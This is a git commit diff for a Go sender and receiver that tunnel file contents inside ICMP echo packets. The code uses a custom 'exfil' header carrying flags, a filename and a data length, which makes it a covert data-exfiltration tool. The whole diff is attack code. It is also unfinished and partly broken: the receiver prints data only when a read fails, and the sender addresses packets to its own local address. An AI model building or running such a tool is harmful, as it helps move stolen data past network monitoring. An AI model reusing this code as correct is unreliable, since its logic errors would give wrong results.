c7f6a6d91ac0babaed840f5e628d267293ea30b0
spookyscaryyy <wbonner20@vt.edu>
2023-09-24 02:21:40 -0400

    short file send

--- recv_src/recv.go
+++ recv_src/recv.go
@@ -1,10 +1,27 @@
 package main
 
 import (
+	"flag"
 	"fmt"
+
+	"golang.org/x/net/icmp"
 )
 
 func main() {
-	fmt.Printf("test\n")
-	return
+	var help = flag.Bool("h", false, "show help.")
+	var host = flag.String("l", "127.0.0.1", "the location ip to read from")
+
+	flag.Parse()
+
+	if *help {
+		flag.PrintDefaults()
+		return
+	}
+	b := make([]byte, 1600)
+	socket, _ := icmp.ListenPacket("ip4:icmp", *host)
+	for {
+		if bytesRead, source, err := socket.ReadFrom(b); err != nil && source != nil && bytesRead != 0 {
+			fmt.Printf("got: %x\n", b)
+		}
+	}
 }
--- send_src/send.go
+++ send_src/send.go
@@ -9,6 +9,7 @@ import (
 	"os"
 
 	"golang.org/x/net/icmp"
+	"golang.org/x/net/ipv4"
 )
 
 const BUFFERSIZE = 512
@@ -16,15 +17,9 @@ const MAXPAYLOAD = 1472
 const MAGIC = 0xA00A
 const FIRSTFLAGMASK = 0x01
 const LASTFLAGMASK = 0x02
-const ICMPHEADLENGTH = 8
 const IPV4ICMP = 8
 
 type exfil struct {
-	typ      uint8
-	code     uint8
-	chksum   uint16
-	id       uint16
-	seq      uint16
 	first    bool
 	last     bool
 	filename string
@@ -32,7 +27,7 @@ type exfil struct {
 }
 
 func initExfil() exfil {
-	return exfil{IPV4ICMP, 0, 0, MAGIC, 0, false, false, "", nil}
+	return exfil{false, false, "", nil}
 }
 
 func buildFlags(pak exfil) byte {
@@ -49,42 +44,13 @@ func buildFlags(pak exfil) byte {
 	return flags
 }
 
-// computes a checksum for byte slice. This is taken from the checksum function
-// created for the "icmp" package in message.go
-func checksum(b []byte) uint16 {
-	csumcv := len(b) - 1 // checksum coverage
-	s := uint32(0)
-	for i := 0; i < csumcv; i += 2 {
-		s += uint32(b[i+1])<<8 | uint32(b[i])
-	}
-	if csumcv&1 == 0 {
-		s += uint32(b[csumcv])
-	}
-	s = s>>16 + s&0xffff
-	s = s + s>>16
-	return ^uint16(s)
-}
-
 func buildExfilPacket(pak exfil) []byte {
 	offset := 0
-	pakLength := len(pak.data) + ICMPHEADLENGTH + 3
+	pakLength := len(pak.data) + 3
 	if pak.first {
 		pakLength += len(pak.filename) + 1
 	}
 	b := make([]byte, pakLength)
-
-	// Building icmp header
-	b[offset] = pak.typ
-	offset += 1
-	b[offset] = pak.code
-	offset += 1
-	binary.BigEndian.PutUint16(b[offset:offset+2], pak.chksum)
-	offset += 2
-	binary.BigEndian.PutUint16(b[offset:offset+2], pak.id)
-	offset += 2
-	binary.BigEndian.PutUint16(b[offset:offset+2], pak.seq)
-	fmt.Printf("b after icmp header %x\n", b)
-	offset += 2
 
 	// flags for exfil header
 	b[offset] = buildFlags(pak)
@@ -95,7 +61,6 @@ func buildExfilPacket(pak exfil) []byte {
 		b[offset] = uint8(len(pak.filename))
 		offset += 1
 		copy(b[offset:offset+len(pak.filename)], []byte(pak.filename))
-		fmt.Printf("b after file %x\n", b)
 		offset += len(pak.filename)
 	}
 
@@ -104,12 +69,6 @@ func buildExfilPacket(pak exfil) []byte {
 	binary.BigEndian.PutUint16(b[offset:offset+2], dataLen)
 	offset += 2
 	copy(b[offset:offset+len(pak.data)], []byte(pak.data))
-	fmt.Printf("b after data %x\n", b)
-
-	// re insert checksum
-	pak.chksum = checksum(b)
-	b[2] ^= byte(pak.chksum)
-	b[3] ^= byte(pak.chksum >> 8)
 
 	return b
 }
@@ -140,9 +99,14 @@ func main() {
 
 	buf := make([]byte, BUFFERSIZE)
 
-	var echoPak = icmp.Echo{MAGIC, 0, nil}
+	var fullPak = icmp.Message{Type: ipv4.ICMPType(IPV4ICMP), Code: 1, Checksum: 0, Body: nil}
+	var echoPak = icmp.Echo{ID: MAGIC, Seq: 0, Data: nil}
 	var fileError error = nil
 	var bytesRead int = 0
+	socket, err := icmp.ListenPacket("ip4:icmp", *host)
+	echoPak.ID = MAGIC
+	echoPak.Seq = 0
+	echoPak.Data = nil
 
 	if *debug {
 		fmt.Printf("flags bytes: %x\n", buildFlags(packet))
@@ -161,7 +125,11 @@ func main() {
 			fmt.Printf("bytes just read: %x\n", buf[0:bytesRead])
 		}
 		pak := buildExfilPacket(packet)
-		fmt.Printf("%x\n", pak)
+		echoPak.Data = pak
+		fullPak.Body = icmp.MessageBody(&echoPak)
+		b, _ := fullPak.Marshal(nil)
+		socket.WriteTo(b, socket.LocalAddr())
+		echoPak.Seq += 1
 	}
 
 	return
